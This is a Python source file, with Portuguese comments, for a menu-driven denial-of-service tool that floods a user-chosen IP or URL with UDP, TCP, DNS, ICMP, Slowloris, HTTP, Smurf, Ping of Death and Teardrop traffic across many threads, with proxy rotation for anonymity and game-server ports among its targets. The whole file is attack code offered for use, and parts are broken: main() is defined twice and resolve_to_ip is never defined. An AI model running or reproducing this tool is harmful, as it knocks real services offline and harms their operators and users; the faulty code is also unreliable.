import socket
import threading
import psutil
import logging
import re
import time
import random
import requests

# Configuração de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Banner em ASCII
banner = r"""
   *                              
 (  `                             
 )\))(      (   (  (     )        
((_)()\  (  )(  )\))( ( /(  (     
(_()((_) )\(()\((_))\ )(_)) )\ )  
|  \/  |((_)((_)(()(_|(_)_ _(_/(  
| |\/| / _ \ '_/ _` |/ _` | ' \)) 
|_|  |_\___/_| \__, |\__,_|_||_|  
               |___/              
"""
print(banner)

# Função para validar o IP
def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip) is not None

# Função para monitorar o uso de rede
def monitor_network_usage():
    net_io = psutil.net_io_counters()
    logging.info(f"Bytes enviados: {net_io.bytes_sent}, Bytes recebidos: {net_io.bytes_recv}")

# Monitorar o uso de rede a cada 60 segundos
def start_network_monitoring():
    while True:
        monitor_network_usage()
        time.sleep(60)

# Iniciar monitoramento de rede em uma thread separada
network_monitor_thread = threading.Thread(target=start_network_monitoring)
network_monitor_thread.daemon = True
network_monitor_thread.start()

# Lista de portas vulneráveis comuns (jogos e serviços)
vulnerable_ports = [
    80,    # HTTP
    443,   # HTTPS
    53,    # DNS
    21,    # FTP
    22,    # SSH
    23,    # Telnet
    25,    # SMTP
    110,   # POP3
    143,   # IMAP
    3389,  # RDP
    25565, # Minecraft
    30120, # FiveM
    27015, # Steam/Game Servers
    10000, # Webmin
    8080,  # Alternative HTTP
    8443,  # Alternative HTTPS
    3306,  # MySQL
    5938,  # TeamViewer
    3724,  # World of Warcraft
    6667,  # IRC
    8888,  # Alternate Web Servers
    1521,  # Oracle Database
    1433,  # Microsoft SQL Server
    9200,  # Elasticsearch
    5000,  # Flask / Development Servers
    5672,  # RabbitMQ
    1883,  # MQTT
    61616, # ActiveMQ
    11211, # Memcached
    6379,  # Redis
    27017, # MongoDB
    7001,  # WebLogic
    8000,  # Generic Web Servers
    9000,  # SonarQube / PHP-FPM
    2049,  # NFS
    5900,  # VNC
    5001,  # Plex Media Server
    8081,  # Alternate HTTP
    8883,  # MQTT over TLS
    5353,  # Multicast DNS
    33060, # MySQL X Protocol
    4243,  # Docker REST API
    9201,  # Elasticsearch (Alternate)
    7000,  # Cassandra
    5432,  # PostgreSQL
    4500,  # IPSec VPN
    389,   # LDAP
    636,   # Secure LDAP (LDAPS)
    1723,  # PPTP VPN
    10001, # SAP NetWeaver
    5357,  # WSDAPI (Microsoft)
]

# Função para rodar proxies
def rotate_proxies():
    proxies = [
        'http://proxy1.example.com:8080',
        'http://proxy2.example.com:8080',
        # Adicione mais proxies conforme necessário
    ]
    return random.choice(proxies)

# Função para criar uma sessão de requests com proxy
def create_proxy_session(proxy):
    session = requests.Session()
    session.proxies = {
        'http': proxy,
        'https': proxy,
    }
    return session

# Função principal
def main():
    use_proxy = input("Deseja usar um proxy para anonimizar o tráfego? (Digite 'y' para usar proxy público, deixe em branco para conexão direta ou insira seu proxy): ")
    if use_proxy.lower() == 'y':
        proxy_ip = rotate_proxies()
    elif use_proxy:
        proxy_ip = use_proxy
    else:
        proxy_ip = None

    if proxy_ip:
        session = create_proxy_session(proxy_ip)
        print(f"Usando proxy: {proxy_ip}")
    else:
        session = requests.Session()
        print("Conexão direta sem proxy.")


# Função para ajuste dinâmico da taxa de envio
def dynamic_rate_limit(rate_limit):
    cpu_usage = psutil.cpu_percent(interval=1)
    if cpu_usage > 80:
        return rate_limit * 1.5
    elif cpu_usage < 50:
        return max(rate_limit * 0.75, 0.1)
    return rate_limit

# Funções de ataque
def udp_flood(ip, ports, rate_limit):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    while True:
        try:
            port = random.choice(ports)
            sock.sendto(bytes_to_send, (ip, port))
            logging.info(f"Pacote UDP enviado para {ip}:{port}")
        except Exception as e:
            logging.error(f"Erro ao enviar pacote UDP para {ip}:{port}: {e}")
        time.sleep(rate_limit)

def tcp_flood(ip, ports, rate_limit):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = random.choice(ports)
            sock.connect((ip, port))
            logging.info(f"Conectado ao {ip}:{port} - Enviando pacotes TCP.")
            sock.send(b'GET / HTTP/1.1\r\n')
            sock.close()
        except socket.error as e:
            logging.error(f"Erro ao enviar pacote TCP para {ip}:{port}: {e}")
        time.sleep(rate_limit)

def tcp_syn_flood(ip, ports, rate_limit):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = random.choice(ports)
            sock.connect((ip, port))
            logging.info(f"SYN enviado para {ip}:{port}")
            sock.close()
        except socket.error as e:
            logging.error(f"Erro ao enviar SYN para {ip}:{port}: {e}")
        time.sleep(rate_limit)

def dns_flood(ip, rate_limit):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dns_query = b'\x12\x34\x56\x78'
            sock.sendto(dns_query, (ip, 53))
            logging.info(f"Consulta DNS enviada para {ip}:53")
        except socket.error as e:
            logging.error(f"Erro ao enviar consulta DNS para {ip}: {e}")
        time.sleep(rate_limit)

def icmp_flood(ip, rate_limit):
    while True:
        rate_limit = dynamic_rate_limit(rate_limit)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.sendto(b'\x08\x00\x00\x00', (ip, 0))
            logging.info(f"Pacote ICMP enviado para {ip}")
        except socket.error as e:
            logging.error(f"Erro ao enviar pacote ICMP para {ip}: {e}")
        time.sleep(rate_limit)

def slowloris_attack(ip, port=80, duration=60):
    logging.info(f"Iniciando Slowloris contra {ip}:{port}")
    end_time = time.time() + duration
    list_of_sockets = []

    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            list_of_sockets.append(sock)
        except socket.error as e:
            logging.error(f"Erro ao conectar: {e}")

    while time.time() < end_time:
        for sock in list_of_sockets:
            try:
                sock.send(b"X-a: b\r\n")
            except socket.error:
                list_of_sockets.remove(sock)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((ip, port))
                    list_of_sockets.append(sock)
                except socket.error as e:
                    logging.error(f"Erro ao reconectar: {e}")
        time.sleep(15)

    logging.info("Slowloris finalizado.")

def http_flood(ip, port=80, duration=60):
    logging.info(f"Iniciando HTTP Flood contra {ip}:{port}")
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode('utf-8')
            sock.send(request)
            logging.info(f"Requisição HTTP enviada para {ip}:{port}")
            sock.close()
        except socket.error as e:
            logging.error(f"Erro ao enviar requisição HTTP para {ip}:{port}: {e}")

def http_flood_via_proxy(session, ip, port=80, duration=60):
    logging.info(f"Iniciando HTTP Flood contra {ip}:{port} via Proxy")
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            response = session.get(f"http://{ip}:{port}")
            logging.info(f"Requisição HTTP enviada para {ip}:{port} via Proxy, status: {response.status_code}")
        except requests.RequestException as e:
            logging.error(f"Erro ao enviar requisição HTTP para {ip}:{port} via Proxy: {e}")

def smurf_attack(ip, rate_limit):
    logging.info("Smurf Attack iniciado. Certifique-se de usar com cuidado.")
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.sendto(b'\x08\x00\x00\x00', (ip, 0))
            logging.info(f"Pacote Smurf enviado para {ip}")
        except socket.error as e:
            logging.error(f"Erro ao enviar pacote Smurf para {ip}: {e}")
        time.sleep(rate_limit)

def ping_of_death(ip, rate_limit):
    logging.info("Ping of Death iniciado. Use apenas em ambientes de teste.")
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.sendto(b'\x08\x00' + random._urandom(65500), (ip, 0))
            logging.info(f"Pacote Ping of Death enviado para {ip}")
        except socket.error as e:
            logging.error(f"Erro ao enviar pacote Ping of Death para {ip}: {e}")
        time.sleep(rate_limit)

def teardrop_attack(ip, rate_limit):
    logging.info("Teardrop Attack iniciado. Use apenas em ambientes de teste.")
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.sendto(b'\x45\x00\x05\xdc' + random._urandom(1480), (ip, 0))
            logging.info(f"Pacote Teardrop enviado para {ip}")
        except socket.error as e:
            logging.error(f"Erro ao enviar pacote Teardrop para {ip}: {e}")
        time.sleep(rate_limit)

# Função para determinar o número ideal de threads
def get_optimal_thread_count():
    cpu_cores = psutil.cpu_count(logical=True)
    ram = psutil.virtual_memory().available // (1024 * 1024)
    max_threads = cpu_cores * 100
    if ram < 2048:
        max_threads = min(max_threads, 200)
    elif ram < 4096:
        max_threads = min(max_threads, 500)
    return max_threads

# Função principal para criar múltiplas threads
def main():
    proxy_choice = input("Deseja usar um proxy para anonimizar o tráfego? (Digite 'y' para usar proxy público, deixe em branco para conexão direta ou insira seu proxy): ").strip()
    session = None

    if proxy_choice.lower() == 'y':
        proxy_ip = rotate_proxies()
        if proxy_ip:
            session = create_proxy_session(proxy_ip)
    elif proxy_choice:
        session = create_proxy_session(proxy_choice)
    
    while True:
        target = input("Digite o IP ou URL alvo: ")
        target_ip = target if is_valid_ip(target) else resolve_to_ip(target)
        
        if target_ip:
            logging.info("Alvo resolvido com sucesso.")
            break
        else:
            print("Por favor, insira um IP ou URL válido.")

    port_input = input("Digite a porta a ser atacada ou pressione Enter para usar portas comuns: ")
    attack_ports = vulnerable_ports if not port_input else [int(port_input)]

    while True:
        print("\nEscolha o tipo de ataque:")
        print("1. UDP Flood - Saturar servidores de jogos online (ex: Minecraft, FiveM).")
        print("2. TCP Flood - Sobrecarga de serviços baseados em TCP (ex: servidores web, jogos).")
        print("3. TCP SYN Flood - Exploração de handshake TCP (ex: servidores web).")
        print("4. DNS Flood - Sobrecarga de servidores DNS.")
        print("5. ICMP Flood - Saturar disponibilidade com pacotes Ping.")
        print("6. Slowloris - Manter conexões HTTP abertas contra servidores web.")
        print("7. HTTP Flood - Sobrecarga de servidores web com requisições HTTP.")
        print("8. Smurf Attack - Sobrecarregar com pacotes ICMP de broadcast.")
        print("9. Ping of Death - Enviar pacotes ICMP malformados.")
        print("10. Teardrop - Enviar pacotes IP fragmentados malformados.")
        print("11. Sair")
        
        choice = input("Digite o número do ataque desejado: ")
        
        if choice in ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]:
            rate_limit = float(input("Digite o intervalo entre pacotes (em segundos, ex: 1 para 1 segundo): ") or 1.0)
            recommended_threads = get_optimal_thread_count()
            user_threads = input(f"Digite o número de threads (ou pressione Enter para usar {recommended_threads}): ")
            num_threads = recommended_threads if not user_threads.strip() else int(user_threads)
            
            for _ in range(num_threads):
                if choice == "1":
                    thread = threading.Thread(target=udp_flood, args=(target_ip, attack_ports, rate_limit))
                elif choice == "2":
                    thread = threading.Thread(target=tcp_flood, args=(target_ip, attack_ports, rate_limit))
                elif choice == "3":
                    thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, attack_ports, rate_limit))
                elif choice == "4":
                    thread = threading.Thread(target=dns_flood, args=(target_ip, rate_limit))
                elif choice == "5":
                    thread = threading.Thread(target=icmp_flood, args=(target_ip, rate_limit))
                elif choice == "6":
                    thread = threading.Thread(target=slowloris_attack, args=(target_ip,))
                elif choice == "7":
                    if session:
                        thread = threading.Thread(target=http_flood_via_proxy, args=(session, target_ip))
                    else:
                        thread = threading.Thread(target=http_flood, args=(target_ip,))
                elif choice == "8":
                    thread = threading.Thread(target=smurf_attack, args=(target_ip, rate_limit))
                elif choice == "9":
                    thread = threading.Thread(target=ping_of_death, args=(target_ip, rate_limit))
                elif choice == "10":
                    thread = threading.Thread(target=teardrop_attack, args=(target_ip, rate_limit))
                thread.start()
        elif choice == "11":
            logging.info("Saindo do script.")
            break
        else:
            logging.error("Escolha inválida.")

if __name__ == "__main__":
    main()
